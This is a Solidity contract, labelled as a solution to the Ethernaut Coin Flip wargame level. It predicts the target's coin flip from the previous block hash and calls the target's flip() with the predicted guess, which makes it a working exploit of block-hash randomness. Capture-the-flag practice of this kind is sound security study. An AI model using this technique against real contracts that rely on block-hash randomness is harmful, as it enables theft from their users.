// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

// Solution for https://ethernaut.openzeppelin.com/ challenge 3 (Coin Flip)
abstract contract CoinFlipInterface {
    function flip(bool _guess) public virtual returns (bool);
}

contract CoinFliper is Ownable {
    CoinFlipInterface coinFlipContract;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() Ownable(msg.sender) {
        consecutiveWins = 0;
        _transferOwnership(msg.sender);
    }

    function setCoinFlipContractAddress(address _address) external onlyOwner {
        coinFlipContract = CoinFlipInterface(_address);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result;
        (result) = coinFlipContract.flip(side);

        if (result) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }

        return result;
    }
}
